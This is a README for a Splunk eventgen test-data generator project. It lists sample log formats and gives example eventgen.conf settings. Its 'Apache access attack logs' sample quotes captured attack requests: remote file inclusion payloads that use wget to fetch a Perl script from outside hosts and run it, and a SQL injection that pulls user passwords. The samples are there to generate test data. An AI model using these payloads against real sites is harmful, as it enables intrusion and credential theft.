# Real time test data generator using eventgen

The Splunk Event Generator is a utility which allows its user to easily build real-time event generators.  This project was originally started by David Hazekamp (dhazekamp@splunk.com) and then enhanced by Clint Sharp (clint@splunk.com).

We would like to extend the usage of this eventgen project to include more test samples obtained from real world and use it to simulate customer data logs generation. And also, to provide more information on how to generate different samples by documenting it.

The goal of this project:
**To provide a test data generator which supports generating different kinds of data and configurable to generate specific data volume with different combinations of data types for testing purpose on Linux as well as Windows.**

Members of this project:
- Christianto Oeij (coeij@splunk.com)
- Angus Hsu (ahsu@splunk.com)
- Angie Shih (ashih@splunk.com)


## *List of available sample logs:*
1. Wineventlog
    * Application
    * System
2. Printer events
3. IIS Logs
    * W3C Extended Log File Format
    * from SPL-108342
    * Psoft H-Sphere IIS Log File Format
4. Apache Logs
    * Apache access logs
    * Apache error logs
    * Apache access attack logs
5. Windows Routing and Remote Access Logs
6. PAM_Unix Logs
7. Datagen Syslog Logs
8. SSHD Logs
9. Su Logs
    * OpenBSD
    * Solaris 10
    * Slackware
    * Ubuntu
10. JBoss Logs
    * Jbosslog4j (Samsung)
11. Linux Logs
    * Cron/crontab logs
    * Linux kernel logs
    * Linux pacman logs
    * Linux S.M.A.R.T logs
    * Linux XFS logs
    * Linux YUM logs
12. BSD Logs
    * OpenBSD logs
    * FreeBSD logs
    * FreeBSD NTP sync logs
13. Asl Logs
14. OSX IPFW Log
15. Mac Log
16. FTP Logs
    * Microsoft FTPD sampe 1 logs
    * Microsoft FTPD sampe 2 logs
    * Microsoft FTPD sampe 3 logs
    * Microsoft FTPD sampe 4 logs
    * Microsoft FTPD sampe 5 logs
    * ProFTPD sample logs
    * PureFTPD sample logs
    * Solaris/HP-UX FTPD sample logs
    * vsftpd sample logs
    * xferlog sample logs
17. SJIS Log (Japanese Log)
18. Suse Linux Logs
    * Useradd logs
    * Userdel logs
    * Useradd & passwd fail logs
19. CSV Japanese Logs



There are two modes supported by Eventgen for data generation, which consist of **Replay Mode** and **Sample Mode**.

_**Replay Mode**_:
The eventgen can take an export from another Splunk instance, or just a plain text file, and replay those events while substituting the time stamps. The eventgen will pause the amount of time between each event just like it happened in the original, so the events will appear to be coming out in real time. When the eventgen reaches the end of the file, it will automatically start over at the beginning.

_**Sample Mode**_:
It takes a file and replay all or a subset of that file every X seconds, defined by the interval. Sample mode is the original way eventgen ran, and it's still very useful for generating random data where you want to engineer the data generated from the ground up. When parameter mode is not defined, the default mode is sample mode.

### How to install this version of eventgen into my splunk instance manually?
**Package location (manually updated)**: http://r.susqa.com/apps/eventgen-susqa/eventgen.zip
* Use command line and go to **$SPLUNK_HOME/bin**
* Type this command line to **install eventgen to your splunk instance**:
```
splunk install app http://r.susqa.com/apps/eventgen-susqa/eventgen.zip -auth admin:changeme
```
* Eventgen app directory will exist under **$SPLUNK_HOME/etc/apps/eventgen**
* **Create a folder name "local"** under $SPLUNK_HOME/etc/apps/eventgen and **configure eventgen.conf under it** refering to the information below depending on which data you want to generate



### How to generate real time events using eventgen on Linux?
* Add eventgen app to $SPLUNK_HOME
* Configure **eventgen.conf** and put it under **$SPLUNK_HOME/etc/apps/eventgen/local** directory:
```
[sample.tutorial2]
interval = 15
earliest = -15s
latest = now
count = 20
hourOfDayRate = { "0": 0.8, "1": 1.0, "2": 0.9, "3": 0.7, "4": 0.5, "5": 0.4, "6": 0.4, "7": 0.4, "8": 0.4, "9": 0.4, "10": 0.4, "11": 0.4, "12": 0.4, "13": 0.4, "14": 0.4, "15": 0.4, "16": 0.4, "17": 0.4, "18": 0.4, "19": 0.4, "20": 0.4, "21": 0.4, "22": 0.5, "23": 0.6 }
dayOfWeekRate = { "0": 0.7, "1": 0.7, "2": 0.7, "3": 0.5, "4": 0.5, "5": 1.0, "6": 1.0 }
randomizeCount = 0.2
randomizeEvents = true
outputMode = file
fileName = /tmp/ciscosample.log
## Replace timestamp Feb  4 07:52:53
token.0.token = \w{3}\s+\d{1,2}\s+\d{2}:\d{2}:\d{2}
token.0.replacementType = timestamp
token.0.replacement = %b %d %H:%M:%S
```
* Restart splunk
* After restarting, it will create a file ciscosample.log under /tmp directory and generating real time events based on the sample file sample.tutorial2 located under $SPLUNK_HOME/etc/apps/eventgen/samples


### How to generate real time events using eventgen on Windows?
* Add eventgen app to $SPLUNK_HOME
* Configure **eventgen.conf** and put it under **$SPLUNK_HOME/etc/apps/eventgen/local** directory:
```
[apache_access.sample]
interval = 1
count = 0
earliest = -1m
latest = now
outputMode = file
fileName = Temp/apache_access_test.log
randomizeEvents = true

## replace timestamp 28/Jul/2006:10:27:10 -0300
token.0.token = \d{2}\/\w{3}\/\d{4}:\d{2}:\d{2}:\d{2}\s+-\d{4}
token.0.replacementType = timestamp
token.0.replacement = %d/%b/%Y:%H:%M:%S -0700
```
* Restart splunk
* After restarting, it will create a file apache_access_test.log under C:\Windows\Temp directory and generating real time events based on the sample file apache_access.sample located under $SPLUNK_HOME/etc/apps/eventgen/samples


### Frequently Ask Questions (FAQ)
1. After starting eventgen and have splunk to monitor the data, the sourcetype was shown as *too_small sourcetype*.
    * **Answer:** Splunk will automatically try to classify your data if you don't specify a sourcetype. For small sets of data, such as less than 100 events, Splunk will label the data as **"too_small"**. Thus, make sure to use value bigger than 100 for the parameter *count* in eventgen.conf for the data you want to generate to avoid this issue.

2. I already set and put eventgen.conf on my splunk instance but why I don't see any event being generated?
    * **Answer:** Make sure that you put the file eventgen.conf under your **$SPLUNK_HOME/etc/apps/eventgen/local**, **not other location**.

3. Same as step 2 and also saw a lot of error messages in splunkd.log saying **TailingProcessor - Ran out of data while looking for end of header**
    * **Answer:** This might be caused by lack of header in the log you are generating. To solve it, try to add parameter **CHECK_FOR_HEADER = false** under the sourcetype stanza in props.conf

## Generating various data traffic

## Wineventlog (Windows only)

### How to generate Application wineventlog on eventgen?
* Configure inputs.conf and put it under $SPLUNK_HOME/etc/apps/eventgen/local directory:
```
[script://$SPLUNK_HOME\etc\apps\eventgen\bin\app_winevents.bat]
disabled = false
interval = 10

[WinEventLog://Application]
checkpointInterval = 5
current_only = 0
disabled = 0
start_from = oldest
```
* Restart splunk
* It will generate 100 application wineventlog events every 10 seconds

### How to generate System wineventlog on eventgen?
* Configure inputs.conf and put it under $SPLUNK_HOME/etc/apps/eventgen/local directory:
```
[script://$SPLUNK_HOME\etc\apps\eventgen\bin\system_winevents.bat]
disabled = false
interval = 10

[WinEventLog://System]
checkpointInterval = 5
current_only = 0
disabled = 0
start_from = oldest
```
* Restart splunk
* It will generate 100 system wineventlog events every 10 seconds

### How to generate printer events on eventgen?
* Configure inputs.conf and put it under $SPLUNK_HOME/etc/apps/eventgen/local directory:
```
[script://$SPLUNK_HOME\etc\apps\eventgen\bin\printmoneventgen.py]
disabled = false
interval = 0

[WinPrintMon://printmon]
type = Driver;Job;Port;Printer
```
* Restart splunk
* It will generate 100 system wineventlog events every 10 seconds

## IIS Logs
#### I. W3C Extended Log File Format
```
2006-08-13 00:00:35 10.3.4.2 GET /iisstart.htm - 80 - 10.3.0.5 check_http/1.7+(nagios-plugins+) 200 0 0
2006-08-13 00:00:56 10.3.4.2 GET /iisstart.htm - 80 - 10.3.3.11 - 200 0 0
2006-08-13 00:01:44 10.3.4.2 GET /iisstart.htm - 80 - 10.3.0.5 check_http/1.7+(nagios-plugins+) 200 0 0
```
Sample file name: **iis_w3c.sample**

Example eventgen.conf:
```
[iis_w3c.sample]
interval = 15
earliest = -15s
latest = now
count = 0
outputMode = file
fileName = Temp/iis_w3c_sample.log
## Replace timestamp 2006-08-13 00:00:35
token.0.token = \d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}
token.0.replacementType = timestamp
token.0.replacement = %Y-%m-%d %H:%M:%S
```

#### IIS test log from SPL-108342:
```
#Software: Internet Information Services 6.0
#Version: 1.0
#Date: 2013-08-06 01:24:38
#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) sc-status sc-substatus sc-win32-status time-taken
2013-1-1 03:12:57 12.1.7.25 GET /favicon.ico - 80 - 12.3.1.69 Mozilla/5.0+(Macintosh;+U;+Intel+Mac+OS+X+12_6_8;+en-us)+AppleWebKit/533.21.1+(KHTML,+like+Gecko)+Version/5.0.5+Safari/533.21.1 404 0 2 1
2013-1-1 03:12:57 12.1.7.25 GET /favicon.ico - 80 - 12.3.1.69 Mozilla/5.0+(Macintosh;+U;+Intel+Mac+OS+X+12_6_8;+en-us)+AppleWebKit/533.21.1+(KHTML,+like+Gecko)+Version/5.0.5+Safari/533.21.1 404 0 2 2
2013-1-1 03:12:57 12.1.7.25 GET /favicon.ico - 80 - 12.3.1.69 Mozilla/5.0+(Macintosh;+U;+Intel+Mac+OS+X+12_6_8;+en-us)+AppleWebKit/533.21.1+(KHTML,+like+Gecko)+Version/5.0.5+Safari/533.21.1 404 0 2 3
2013-1-1 03:12:57 12.1.7.25 GET /favicon.ico - 80 - 12.3.1.69 Mozilla/5.0+(Macintosh;+U;+Intel+Mac+OS+X+12_6_8;+en-us)+AppleWebKit/533.21.1+(KHTML,+like+Gecko)+Version/5.0.5+Safari/533.21.1 404 0 2 4
2013-1-1 03:12:57 12.1.7.25 GET /favicon.ico - 80 - 12.3.1.69 Mozilla/5.0+(Macintosh;+U;+Intel+Mac+OS+X+12_6_8;+en-us)+AppleWebKit/533.21.1+(KHTML,+like+Gecko)+Version/5.0.5+Safari/533.21.1 404 0 2 5
2013-1-1 03:12:57 12.1.7.25 GET /favicon.ico - 80 - 12.3.1.69 Mozilla/5.0+(Macintosh;+U;+Intel+Mac+OS+X+12_6_8;+en-us)+AppleWebKit/533.21.1+(KHTML,+like+Gecko)+Version/5.0.5+Safari/533.21.1 404 0 2 6
```

Sample file name: **iis_spl108342.sample**

Example eventgen.conf:
```
[iis_spl108342.sample]
interval = 15
earliest = -15s
latest = now
count = 10
outputMode = file
fileName = Temp/iis_spl108342_sample.log

## Replace timestamp 2013-1-1 03:12:57
token.0.token = \d{4}-\d{1,2}-\d{1,2} \d{2}:\d{2}:\d{2}
token.0.replacementType = timestamp
token.0.replacement = %Y-%m-%d %H:%M:%S
```

#### II. Psoft H-Sphere IIS Log File Format
```
#Software: H-Sphere log plugin
#Date: 2007-03-03 01:17:39
#Fields: date time c-ip cs-username s-sitename s-computername s-ip s-port cs-method cs-uri-stem cs-uri-query sc-status sc-win32-status sc-bytes cs-bytes time-taken cs-version cs(User-Agent) cs(Cookie) cs(Referer)
2007-03-03 01:17:39 66.194.6.79 - W3SVC3 SERVER55 192.168.1.15 80 GET /index.html - 200 0 17691 117 15 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.1;+Q312460) - -
2007-03-03 10:23:40 24.252.248.163 - W3SVC3 SERVER55 192.168.1.15 80 GET /images/9a.jpg - 200 0 32022 324 47 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.1;+SV1;+.NET+CLR+1.1.4322) - http://www.yahoo.com/
```
Sample file name: **iis_psofthsphere.sample**

Example eventgen.conf:
```
[iis_psofthsphere.sample]
interval = 15
earliest = -15s
latest = now
count = 0
outputMode = file
fileName = Temp/iis_psofthsphere_sample.log
## Replace timestamp 2006-08-13 00:00:35
token.0.token = \d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}
token.0.replacementType = timestamp
token.0.replacement = %Y-%m-%d %H:%M:%S
```


## Apache Logs
#### I. Apache access logs
```
192.168.2.20 - - [28/Jul/2006:10:27:10 -0300] "GET /cgi-bin/try/ HTTP/1.0" 200 3395
127.0.0.1 - - [28/Jul/2006:10:22:04 -0300] "GET / HTTP/1.0" 200 2216
127.0.0.1 - - [28/Jul/2006:10:27:32 -0300] "GET /hidden/ HTTP/1.0" 404 7218
x.x.x.90 - - [13/Sep/2006:07:01:53 -0700] "PROPFIND /svn/[xxxx]/Extranet/branches/SOW-101 HTTP/1.1" 401 587
x.x.x.90 - - [13/Sep/2006:07:01:51 -0700] "PROPFIND /svn/[xxxx]/[xxxx]/trunk HTTP/1.1" 401 587
x.x.x.90 - - [13/Sep/2006:07:00:53 -0700] "PROPFIND /svn/[xxxx]/[xxxx]/2.5 HTTP/1.1" 401 587
x.x.x.90 - - [13/Sep/2006:07:00:53 -0700] "PROPFIND /svn/[xxxx]/Extranet/branches/SOW-101 HTTP/1.1" 401 587
x.x.x.90 - - [13/Sep/2006:07:00:21 -0700] "PROPFIND /svn/[xxxx]/[xxxx]/trunk HTTP/1.1" 401 587
x.x.x.90 - - [13/Sep/2006:06:59:53 -0700] "PROPFIND /svn/[xxxx]/[xxxx]/2.5 HTTP/1.1" 401 587
x.x.x.90 - - [13/Sep/2006:06:59:50 -0700] "PROPFIND /svn/[xxxx]/[xxxx]/trunk HTTP/1.1" 401 587
x.x.x.90 - - [13/Sep/2006:06:58:52 -0700] "PROPFIND /svn/[xxxx]/[xxxx]/trunk HTTP/1.1" 401 587
x.x.x.90 - - [13/Sep/2006:06:58:52 -0700] "PROPFIND /svn/[xxxx]/Extranet/branches/SOW-101 HTTP/1.1" 401 587
```
Sample file name: **apache_access.sample**

Example eventgen.conf:
```
[apache_access.sample]
interval = 15
earliest = -15s
latest = now
count = 10
randomizeEvents = true
outputMode = file
fileName = Temp/apache_access_sample.log
## Replace timestamp 28/Jul/2006:10:27:10 -0300
token.0.token = \d{2}/\w{3}/\d{4}:\d{2}:\d{2}:\d{2} -\d{4}
token.0.replacementType = timestamp
token.0.replacement = %d/%b/%Y:%I:%M:%S -0300
```

#### II. Apache error logs
```
[Fri Dec 16 01:46:23 2005] [error] [client 1.2.3.4] Directory index forbidden by rule: /home/test/
[Fri Dec 16 01:54:34 2005] [error] [client 1.2.3.4] Directory index forbidden by rule: /apache/web-data/test2
[Fri Dec 16 02:25:55 2005] [error] [client 1.2.3.4] Client sent malformed Host header
[Mon Dec 19 23:02:01 2005] [error] [client 1.2.3.4] user test: authentication failure for "/~dcid/test1": Password Mismatch
** Normal (v2.x)
[Sat Aug 12 04:05:51 2006] [notice] Apache/1.3.11 (Unix) mod_perl/1.21 configured -- resuming normal operations
[Thu Jun 22 14:20:55 2006] [notice] Digest: generating secret for digest authentication ...
[Thu Jun 22 14:20:55 2006] [notice] Digest: done
[Thu Jun 22 14:20:55 2006] [notice] Apache/2.0.46 (Red Hat) DAV/2 configured -- resuming normal operations
** Restart by HUP signal (optional suEXEC)
[Sat Aug 12 04:05:49 2006] [notice] SIGHUP received.  Attempting to restart
[Sat Aug 12 04:05:51 2006] [notice] suEXEC mechanism enabled (wrapper: /usr/local/apache/sbin/suexec)
** after 'unclean' shutdown (left over PID file)
[Sat Jun 24 09:06:22 2006] [warn] pid file /opt/CA/BrightStorARCserve/httpd/logs/httpd.pid overwritten -- Unclean shutdown of previous Apache run?
[Sat Jun 24 09:06:23 2006] [notice] Apache/2.0.46 (Red Hat) DAV/2 configured -- resuming normal operations
[Sat Jun 24 09:06:22 2006] [notice] Digest: generating secret for digest authentication ...
[Sat Jun 24 09:06:22 2006] [notice] Digest: done
[Thu Jun 22 11:35:48 2006] [notice] caught SIGTERM, shutting down
[Tue Mar 08 10:34:21 2005] [error] (11)Resource temporarily unavailable: fork: Unable to fork new process
[Tue Mar 08 10:34:31 2005] [error] (11)Resource temporarily unavailable: fork: Unable to fork new process
```
Sample file name: **apache_error.sample**

Example eventgen.conf:
```
[apache_error.sample]
interval = 15
earliest = -15s
latest = now
count = 10
randomizeEvents = true
outputMode = file
fileName = Temp/apache_error_sample.log
## Replace timestamp Fri Dec 16 01:46:23 2005
token.0.token = \w{3}\s+\w{3}\s+\d{2}\s+\d{2}:\d{2}:\d{2}\s+\d{4}
token.0.replacementType = timestamp
token.0.replacement = %a %b %d %I:%M:%S %Y
```

#### III. Apache access attack logs
```
193.91.75.11 - - [18/Aug/2006:13:23:13 -0300] "GET /index.php?_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=http://www.freewebs.com/nokia-yes/tool.gif?&cmd=cd%20/tmp/;wget%20http://www.freewebs.com/nokia-yes/mambo.txt;perl%20mambo.txt;rm%20-rf%20mambo.*? HTTP/1.0" 200 167 "-" "Mozilla/5.0"
212.227.132.51 - - [18/Aug/2006:05:24:07 -0300] "GET /index.php?_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=http://www.openkid.co.kr/tool.gif?&cmd=cd%20/tmp/;wget%20http://www.openkid.co.kr/mambo.txt;perl%20mambo.txt;rm%20-rf%20mambo.*? HTTP/1.0" 200 167 "-" "Mozilla/5.0"
201.226.254.210 - - [18/Aug/2006:13:47:46 -0300] "GET /index.php?_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=http://www.freewebs.com/nokia-yes/tool.gif?&cmd=cd%20/tmp/;wget%20http://www.freewebs.com/nokia-yes/mambo.txt;perl%20mambo.txt;rm%20-rf%20mambo.*? HTTP/1.0" 200 167 "-" "Mozilla/5.0"
212.227.132.51 - - [18/Aug/2006:13:56:29 -0300] "GET /index.php?_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=http://www.freewebs.com/nokia-yes/tool.gif?&cmd=cd%20/tmp/;wget%20http://www.freewebs.com/nokia-yes/mambo.txt;perl%20mambo.txt;rm%20-rf%20mambo.*? HTTP/1.0" 200 167 "-" "Mozilla/5.0"
62.103.159.21 - - [18/Aug/2006:13:58:02 -0300] "GET /index.php?_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=http://www.freewebs.com/nokia-yes/tool.gif?&cmd=cd%20/tmp/;wget%20http://www.freewebs.com/nokia-yes/mambo.txt;perl%20mambo.txt;rm%20-rf%20mambo.*? HTTP/1.0" 200 167 "-" "Mozilla/5.0"
207.36.232.148 - - [28/Aug/2006:07:08:46 -0300] "GET /index.php/Artigos/modules/Forums/admin/admin_users.php?phpbb_root_path=http://paupal.info/folder/cmd1.gif?&cmd=cd%20/tmp/;wget%20http://paupal.info/folder/mambo1.txt;perl%20mambo1.txt;rm%20-rf%20mambo1.*? HTTP/1.0" 200 14611 "-" "Mozilla/5.0"
193.255.143.5 - - [28/Aug/2006:07:52:45 -0300] "GET /index.php/modules/Forums/admin/admin_users.php?phpbb_root_path=http://virtual.uarg.unpa.edu.ar/myftp/list.txt?&cmd=cd%20/tmp/;wget%20http://paupal.info/folder/mambo1.txt;perl%20mambo1.txt;rm%20-rf%20mambo1.*? HTTP/1.0" 200 14527 "-" "Mozilla/5.0"
200.96.104.241 - - [12/Sep/2006:09:44:28 -0300] "GET /modules.php?name=Downloads&d_op=modifydownloadrequest&%20lid=-1%20UNION%20SELECT%200,username,user_id,user_password,name,%20user_email,user_level,0,0%20FROM%20nuke_users HTTP/1.1" 200 9918 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)"
```
Sample file name: **apache_access_attack.sample**

Example eventgen.conf:
```
[apache_access_attack.sample]
interval = 15
earliest = -15s
latest = now
count = 10
randomizeEvents = true
outputMode = file
fileName = Temp/apache_access_attack_sample.log
## Replace timestamp 28/Jul/2006:10:27:10 -0300
token.0.token = \d{2}/\w{3}/\d{4}:\d{2}:\d{2}:\d{2} -\d{4}
token.0.replacementType = timestamp
token.0.replacement = %d/%b/%Y:%I:%M:%S -0300
```

## Windows Routing and Remote Access Logs
```
"RasBox","RAS",10/22/2006,09:13:09,1,"ACME\slimjim","ACME\slimjim",,,,,,"192.168.132.45",12,,"192.168.132.45",,,,0,"CONNECT 24000",1,2,4,,0,"311 1 192.168.132.45 07/31/2006 21:35:14 749",,,,,,,,,,,,,,,,,,,,,,,,,,,,"MSRASV5.00",311,,,,
"RasBox","RAS",10/22/2006,09:13:09,3,,"ACME\slimjim",,,,,,,,,,,,,,,,,4,,36,"311 1 192.168.132.45 07/31/2006 21:35:14 749",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"0x00453D36393120523D3020563D33",,,
"RasBox","RAS",10/22/2006,09:13:13,1,"ACME\slimjim","ACME\slimjim",,,,,,"192.168.132.45",12,,"192.168.132.45",,,,0,"CONNECT 24000",1,2,4,,0,"311 1 192.168.132.45 07/31/2006 21:35:14 750",,,,,,,,,,,,,,,,,,,,,,,,,,,,"MSRASV5.00",311,,,,
"RasBox","RAS",10/22/2006,09:13:13,3,,"ACME\slimjim",,,,,,,,,,,,,,,,,4,,36,"311 1 192.168.132.45 07/31/2006 21:35:14 750",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"0x00453D36393120523D3020563D33",,,
"RasBox","RAS",10/22/2006,09:13:21,1,"ACME\slimjim","ACME\slimjim",,,,,,"192.168.132.45",12,,"192.168.132.45",,,,0,"CONNECT 24000",1,2,4,,0,"311 1 192.168.132.45 07/31/2006 21:35:14 751",,,,,,,,,,,,,,,,,,,,,,,,,,,,"MSRASV5.00",311,,,,
"RasBox","RAS",10/22/2006,09:13:21,3,,"ACME\slimjim",,,,,,,,,,,,,,,,,4,,36,"311 1 192.168.132.45 07/31/2006 21:35:14 751",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"0x00453D36393120523D3020563D33",,,
"RasBox","RAS",10/22/2006,09:14:37,1,"ACME\slimjim","ACME\slimjim",,,,,,"192.168.132.45",12,,"192.168.132.45",,,,0,"CONNECT 24000",1,2,4,,0,"311 1 192.168.132.45 07/31/2006 21:35:14 752",,,,,,,,,,,,,,,,,,,,,,,,,,,,"MSRASV5.00",311,,,,
"RasBox","RAS",10/22/2006,09:14:37,1,"ACME\slimjim","ACME\slimjim",,,,,,"192.168.132.45",12,,"192.168.132.45",,,,0,"CONNECT 24000",1,2,4,,0,"311 1 192.168.132.45 07/31/2006 21:35:14 752",,,,,,,,,,,,,,,,,,,,,,,,,,,,"MSRASV5.00",311,,,,
"RasBox","RAS",10/22/2006,09:14:37,3,,"ACME\slimjim",,,,,,,,,,,,,,,,,4,,36,"311 1 192.168.132.45 07/31/2006 21:35:14 752",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"0x00453D36393120523D3020563D33",,,
"RasBox","RAS",10/22/2006,11:57:11,1,"ACME\megaman","ACME\megaman",,,,,,"192.168.132.45",13,,"192.168.132.45",,,,0,"CONNECT 26400",1,2,4,,0,"311 1 192.168.132.45 07/31/2006 21:35:14 753",,,,,,,,,,,,,,,,,,,,,,,,,,,,"MSRASV5.00",311,,,,
"RasBox","RAS",10/22/2006,11:57:11,3,,"ACME\megaman",,,,,,,,,,,,,,,,,4,,16,"311 1 192.168.132.45 07/31/2006 21:35:14 753",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"0x00453D36393120523D3020563D33",,,
"RasBox","RAS",10/22/2006,11:57:54,1,"ACME\megaman","acme.net/Users/megaman",,,,,,"192.168.132.45",13,,"192.168.132.45",,,,0,"CONNECT 26400",1,2,4,,0,"311 1 192.168.132.45 07/31/2006 21:35:14 754",,,,,,,,,,,,,,,,,,,,,,,,,,,,"MSRASV5.00",311,,,,
```
Sample file name: **windows_routing_remote_access.sample**

Example eventgen.conf:
```
[windows_routing_remote_access.sample]
interval = 60
earliest = -60s
latest = now
count = 10
randomizeEvents = true
outputMode = file
fileName = Temp/windows_routing_remote_access_sample.log
## Replace timestamp 10/22/2006,09:13:09,
token.0.token = \d{2}/\d{2}/\d{4},\d{2}:\d{2}:\d{2},
token.0.replacementType = timestamp
token.0.replacement = %m/%d/%Y,%H:%M:%S,
```

## PAM_Unix Logs
```
Jul  7 10:51:24 srbarriga su(pam_unix)[14592]: session opened for user test2 by (uid=10101)
Jul  7 10:52:14 srbarriga sshd(pam_unix)[17365]: session opened for user test by (uid=508)
Nov 17 21:41:22 localhost su[8060]: (pam_unix) session opened for user root by (uid=0)
Nov 11 22:46:29 localhost vsftpd: pam_unix(vsftpd:auth): authentication failure; logname= uid=0 euid=0 tty= ruser= rhost=1.2.3.4
Jul  7 10:53:07 srbarriga su(pam_unix)[14592]: session closed for user test
Jul  7 10:55:56 srbarriga sshd(pam_unix)[16660]: authentication failure; logname= uid=0 euid=0 tty=NODEVssh ruser= rhost=192.168.20.111  user=root
Jul  7 10:59:12 srbarriga vsftpd(pam_unix)[25073]: authentication failure; logname= uid=0 euid=0 tty= ruser= rhost=192.168.20.111
Jul  7 10:59:49 srbarriga vsftpd(pam_unix)[25073]: check pass; user unknown
```
Sample file name: **pam_unix.sample**

Example eventgen.conf:
```
[pam_unix.sample]
interval = 60
earliest = -60s
latest = now
count = 10
randomizeEvents = true
outputMode = file
fileName = Temp/pam_unix_sample.log

## Replace timestamp Nov 17 21:41:22
token.0.token = \w{3}\s+\d{1,2} \d{2}:\d{2}:\d{2}
token.0.replacementType = timestamp
token.0.replacement = %b %d %H:%M:%S
```

## Datagen Syslog Logs
```
<149>Feb 14 11:56:55 2011 datagen-host5 postfix/smtpd[18948]: HT2G3KNF3A: client=unknown[121.51.206.115]
<29>Feb 14 11:56:55 2011 datagen-host77 postfix/smtpd[10912]: disconnect from unknown[241.137.40.91]
<1>Feb 14 11:56:55 2011 datagen-host32 snmpd[9983]: truncating integer value > 32 bits
<122>Feb 14 11:56:55 2011 datagen-host61 status=304 DHCPACK=ASCII from host=146.249.138.174
<114>Feb 14 11:56:55 2011 datagen-host97 crond[24895]: (root) CMD (run-parts /etc/cron.hourly)
<142>Feb 14 11:56:56 2011 datagen-host14 /usr/sbin/cron[13259]: (aalbrecht) CMD (cd $JFFNMS && php -q consolidate.php >/dev/null 2>&1)
<45>Feb 14 11:56:56 2011 datagen-host20 sshd(pam_unix)[26797]: session opened for user egreene by (pid=26797) ASCII
<43>Feb 14 11:56:56 2011 datagen-host99 crond[29152]: (root) CMD (run-parts /etc/cron.hourly)
<74>Feb 14 11:56:56 2011 datagen-host66 sshd(pam_unix)[9548]: session opened for user tshim by (pid=9548) ASCII
<43>Feb 14 11:56:56 2011 datagen-host6 sshd(pam_unix)[21570]: session opened for user qpark by (pid=21570) ASCII
<139>Feb 14 11:56:57 2011 datagen-host92 snmpd[29739]: truncating integer value > 32 bits
 ```

Sample file name: **datagen_syslog.sample**

Example eventgen.conf:
```
[datagen_syslog.sample]
interval = 60
earliest = -60s
latest = now
count = 10
randomizeEvents = true
outputMode = file
fileName = Temp/datagen_syslog.log

## Replace timestamp Feb 14 11:56:55 2011
token.0.token = \w{3}\s+\d{1,2} \d{2}:\d{2}:\d{2} \d{4}
token.0.replacementType = timestamp
token.0.replacement = %b %d %H:%M:%S %Y
```

## SSHD Logs
```
May 21 20:22:28 slacker sshd[21487]: Failed password for root from 192.168.20.185 port 1045 ssh2
May 21 20:22:28 slacker2 sshd[8813]: Accepted password for root from 192.168.20.185 port 1066 ssh2
May 21 20:22:28 sol2 sshd[23857]: [ID 702911 auth.notice] User test1, coming from 192.168.2.185,  -  authenticated.
Jul  7 10:51:24 chaves sshd[19537]: Invalid user admin from spongebob.lab.ossec.net
Jul  7 10:53:24 chaves sshd[12914]: Failed password for invalid user test-inv from spongebob.lab.ossec.net
Jul  7 10:53:24 kiko sshd[3251]: User dcid not allowed because listed in DenyUsers
```
Sample file name: **sshd.sample**

Example eventgen.conf:
```
[sshd.sample]
interval = 60
earliest = -60s
latest = now
count = 10
randomizeEvents = true
outputMode = file
fileName = Temp/sshd_sample.log
## Replace timestamp Nov 17 21:41:22
token.0.token = \w{3}\s+\d{1,2} \d{2}:\d{2}:\d{2}
token.0.replacementType = timestamp
token.0.replacement = %b %d %H:%M:%S
```

## Su Logs
#### I. OpenBSD
```
Feb 12 19:11:27 enigma su: dcid to root on /dev/ttyp0
Feb 12 19:11:41 enigma su: BAD SU dcid to root on /dev/ttyp0
Feb 12 19:11:48 enigma su: dcid to root on /dev/ttyp0
```

Sample file name: **su_openbsd.sample**

Example eventgen.conf:
```
[su_openbsd.sample]
interval = 60
earliest = -60s
latest = now
count = 10
randomizeEvents = true
outputMode = file
fileName = Temp/su_openbsd_sample.log
## Replace timestamp Nov 17 21:41:22
token.0.token = \w{3}\s+\d{1,2} \d{2}:\d{2}:\d{2}
token.0.replacementType = timestamp
token.0.replacement = %b %d %H:%M:%S
```

#### II. Solaris 10:
```
SU 07/23 00:57 + ??? root-root
SU 07/23 01:24 + pts/4 lcid-root
SU 07/23 19:12 + pts/2 lcid-root
SU 07/23 19:30 + pts/3 lcid-root
SU 07/23 19:32 - pts/3 lcid-root
SU 07/23 19:32 + pts/3 lcid-root
SU 02/12 19:27 + pts/2 lcid-root
SU 02/12 19:16 + pts/2 lcid-root
```

Sample file name: **su_solaris10.sample**

Example eventgen.conf:
```
[su_solaris10.sample]
interval = 15
earliest = -15s
latest = now
count = 10
randomizeEvents = true
outputMode = file
fileName = Temp/su_solaris10_sample.log

## Replace timestamp 07/23 00:57
token.0.token = \d{1,2}/\d{1,2} \d{2}:\d{2}
token.0.replacementType = timestamp
token.0.replacement = %m/%d %H:%M
```

#### III. Slackware
``` Jul  5 22:13:15 lili su[2614]: - pts/6 dcid-root
Jul  5 22:13:36 lili su[2711]: + pts/6 dcid-root
```
Sample file name: **su_slackware.sample**

Example eventgen.conf:
```
[su_slackware.sample]
interval = 60
earliest = -60s
latest = now
count = 10
randomizeEvents = true
outputMode = file
fileName = Temp/su_slackware_sample.log
## Replace timestamp Nov 17 21:41:22
token.0.token = \w{3}\s+\d{1,2} \d{2}:\d{2}:\d{2}
token.0.replacementType = timestamp
token.0.replacement = %b %d %H:%M:%S
```

#### IV. Ubuntu
```
Feb 12 15:47:40 localhost su[29149]: - pts/5 dcid:root
Feb 12 15:47:45 localhost su[29150]: + pts/5 dcid:root
Feb 12 15:11:41 enigma su[2936]: failed: ttyq4 changing from xx to root
```

